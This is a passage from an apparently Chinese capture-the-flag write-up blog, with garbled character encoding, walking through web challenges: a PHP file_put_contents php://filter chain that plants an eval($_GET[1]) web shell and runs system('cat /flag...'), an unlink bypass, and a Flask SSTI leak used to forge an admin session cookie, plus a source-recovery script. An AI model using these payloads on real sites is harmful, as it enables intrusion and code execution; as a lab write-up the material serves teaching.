&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šä¼ åŽåˆ°/upload/s1.phpé¡µé¢å°±å¯ä»¥çœ‹åˆ°flagäº†&lt;/p>
&lt;p>ä¸Šé¢phpè¿˜æœ‰ä¸ªç»•è¿‡unlinkçš„åœ°æ–¹ï¼Œåœ¨n1çš„é¢˜é‡Œæ˜¯ç”¨ä¸€ä¸ª.shæ‰§è¡Œçš„åˆ é™¤å‘½ä»¤ï¼Œé‚£æ ·çš„è¯å¯ä»¥ç”¨&lt;code>-asdd.php&lt;/code>è¿™æ ·ç»•è¿‡ï¼Œå› ä¸ºå¼€å¤´æ˜¯ä¸ª&lt;code>-&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”â€”â€”æ€»ç»“ï¼šè‚¥è‚ å¤æ‚çš„ä¸€é“é¢˜ï¼Œæ‚æ‰äº†md5ç¢°æ’žã€SoapClientåŽŸç”Ÿç±»ååºåˆ—åŒ–ã€å†…ç½‘æ‰«æã€SSRFã€phpçš„trickç­‰ç­‰ä¸€ç³»åˆ—è€ƒç‚¹ï¼Œå°±åˆ«è¯´çŽ°åšäº†ï¼Œå°±æ˜¯å¤çŽ°çš„éš¾åº¦ä¹ŸæŒºé«˜çš„ï¼Œå¸ˆå‚…ä»¬ç‰›é€¼&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xz.aliyun.com/t/6050#toc-10">wp1&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6170.html#0x02ShellShellShell">wp2&lt;/a> | &lt;a href="https://xi4or0uji.github.io/2018/11/06/2018%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/#web2">wp11&lt;/a> | &lt;a href="https://cloud.tencent.com/developer/article/1360551">wp12&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[WMCTF2020]Web Check in 2.0
&lt;/h4>
&lt;/summary>
&lt;p>æœ¬æ¥ä¸‹åˆ2ç‚¹å°±è¯¥å¼€å§‹åšçš„ï¼Œä½†æ˜¯ä¸‹åˆåŽ»è¯•å­¦æ ¡ç«™çš„log4j2äº†ï¼Œç»“æžœè¿™ä¸ªæ´žæ²¡è¯•å‡ºæ¥ æ‹¿äº†ä¸€äº›å¼±å£ä»¤ï¼Œæ— å¿ƒæ’æŸ³äº†å±žäºŽæ˜¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">62&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sandbox:/var/www/html/sandbox/437a765460ed3657d5fb80d24456c9e5&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75715e">//PHP 7.0.33 Apache/2.4.25
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/var/www/html/sandbox/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// æ²™ç›’ è·¯å¾„ç¡®å®š&amp;amp;å·²çŸ¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Sandbox:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/iconv|UCS|UTF|rot|quoted|base64/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#75715e">// ç¦äº†ä¸€äº›ä¼ªåè®®è¯»æ–‡ä»¶çš„ç¼–ç æ–¹å¼
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hacker&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ–‡ä»¶åŒ…å«
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exit();&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// æ­»äº¡exit()ç»•è¿‡
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ç‚¹ç®€å•åˆ†æžå†™æ³¨é‡Šäº†ï¼Œé¦–å…ˆæ˜¯ä¼ªåè®®çš„éƒ¨åˆ†ï¼Œ&lt;code>file_put_contents()&lt;/code>æ”¯æŒä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶è¦å…ˆurldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚çš„æ—¶å€™å¯ä»¥å†ç¼–ä¸€æ¬¡ç &lt;/p>
&lt;p>å‡ºé¢˜äººçš„è¿™ç¯‡åšå®¢å†™çš„ç‰¹åˆ«è¯¦ç»†ï¼š&lt;a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">å…³äºŽfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•&lt;/a>&lt;/p>
&lt;p>è¿œç¨‹çŽ¯å¢ƒä¸­&lt;code>%25&lt;/code>è¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬æž„é€ åˆ«çš„æ–¹å¼çš„2æ¬¡ç¼–ç ï¼Œæ¯”å¦‚&lt;code>%7%23&lt;/code>-&amp;gt;&lt;code>%72&lt;/code>-&amp;gt;&lt;code>r&lt;/code>å°±å¯ä»¥äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">#æž„é€ rçš„äºŒæ¬¡ç¼–ç 
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ascii1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii1&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii1&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ascii2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii2&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$ascii2&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$aaa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;%&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ascii1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;%&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ascii2&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$char&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$char&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬é€‰æ‹©rot13ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0deval($_GET[1]);?&amp;gt;/resource=Cyc1e.php
&lt;/code>&lt;/pre>&lt;p>ä¸Šä¼ çš„å†…å®¹å°±ä¼šåˆ°Cycle.phpä¸­ï¼Œ&lt;code>?1=system('ls');&lt;/code>ï¼Œ&lt;code>?1=system('cat /flag_2233_elkf3ifj34ij3orf3fk4');&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
***[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board
&lt;/h4>
&lt;/summary>
&lt;p>flaskï¼Œé¡µé¢æœ‰ä¸‰ä¸ªè¾“å…¥æ¡†ï¼Œè¿˜æœ‰æ ‡å¿—æ€§çš„sessionï¼ŒAuthorè¾“å…¥æ¡†å¤„å­˜åœ¨SSTIï¼Œå°è¯•èŽ·å–keyæ¥ä¼ªé€ session&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211161219803.png" alt="image-20211211161219803">&lt;/p>
&lt;p>&lt;code>'SECRET_KEY': '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI'&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œä¼ªé€ çš„æ—¶å€™è¦æ³¨æ„flask session cookie managerè§£å¯†å‡ºæ¥çš„æ—¶å€™æŠŠFalseçš„å¤§å†™ç»™åŽ»æŽ‰äº†ï¼Œæˆ‘ä»¬æž„é€ å›žåŽ»çš„æ—¶å€™åº”è¯¥ç”¨å¤§å†™å¼€å¤´çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI' -t &amp;quot;{'admin':True}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>åˆ°/adminå¤„æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211161952272.png" alt="image-20211211161952272">&lt;/p>
&lt;p>çœ‹é¡µé¢æºç å‘çŽ°è¿˜æœ‰æç¤º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162036595.png" alt="image-20211211162036595">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162331506.png" alt="image-20211211162331506">&lt;/p>
&lt;p>ä¸‹è½½/admin/model_downloadï¼Œå¾—åˆ°è¿™ä¹ˆä¸ªçŽ©æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162228429.png" alt="image-20211211162228429">&lt;/p>
&lt;p>/admin/source_thanoså¯ä»¥ç›´æŽ¥è®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162359950.png" alt="image-20211211162359950">&lt;/p>
&lt;p>å°±ä»–å¦ˆç¦»è°±ï¼Œè¿™ä¸ªæºç æ˜¯éšæœºæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¾ç¤ºä½ç½®å›ºå®šï¼Œå¾—æžä¸ªè„šæœ¬åšå¤åŽŸ&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
url = 'http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos'
r = requests.get(url)
source = r.text
for j in range(10):
r = requests.get(url)
for i in range(len(source)):
if source[i].isspace():
source = source[:i] + r.text[i] + source[i+1:]
print(source)
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># coding=utf8&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_file&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">datetime&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">datetime&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#75715e"># init app&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;il1I|&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Response&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">safe_join&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">abort&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">site_title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;A Flask Message Board&amp;#34;&lt;/span>
&lt;span style="color:#111">site_description&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Just leave what you want to say.&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># %% tf/load.py&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tensorflow&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">tf&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">tensorflow.python&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pywrap_tensorflow&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> This model is given by a famous hacker !
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">new_sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tf&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">meta_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">model_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.meta&amp;#34;&lt;/span>
&lt;span style="color:#111">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">model_path&lt;/span>
&lt;span style="color:#111">saver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tf&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">train&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">import_meta_graph&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">meta_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">saver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">new_sess&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">predict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> :param x: input number x
&lt;/span>&lt;span style="color:#d88200"> sess: tensorflow session
&lt;/span>&lt;span style="color:#d88200"> :return: b&amp;#39;You are: *&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">graph&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get_tensor_by_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;y:0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">y_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;x:0&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">y_out&lt;/span>
&lt;span style="color:#111">tf_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;tf/detection_model/detection&amp;#34;&lt;/span>
&lt;span style="color:#111">sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tf_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># %% tf end&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check_bot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">input_str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">predict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">input_str&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
